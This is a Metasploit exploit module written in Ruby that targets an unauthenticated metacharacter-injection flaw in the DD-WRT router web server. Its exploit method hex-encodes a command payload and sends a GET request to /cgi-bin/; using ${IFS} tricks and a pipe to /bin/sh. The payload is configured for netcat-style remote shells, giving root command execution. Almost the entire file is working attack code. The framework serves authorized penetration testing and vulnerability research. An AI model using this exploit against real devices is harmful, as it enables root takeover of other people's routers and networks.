##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'DD-WRT HTTP Daemon Arbitrary Command Execution',
			'Description'    => %q{
				This module abuses a metacharacter injection vulnerability in the
			HTTP management server of wireless gateways running DD-WRT. This flaw
			allows an unauthenticated attacker to execute arbitrary commands as
			the root user account.
			},
			'Author'         => [ 'gat3way', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '35742' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/9209'],

				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,				
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'RequiredCmd' => 'generic netcat-e'
						}
				},
			'Targets'        => 
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(80)
				], self.class)
	end
	
	def exploit
		connect

		cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}
		str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"
		req = 
			"GET /cgi-bin/;#{str} HTTP/1.1\r\n" +
			"Host: #{rhost}\r\n" +
			"Content-Length: 0\r\n\r\n"
		
		print_status("Sending GET request with encoded command line...")
		sock.put(req)
		
		handler
		disconnect
	end

end
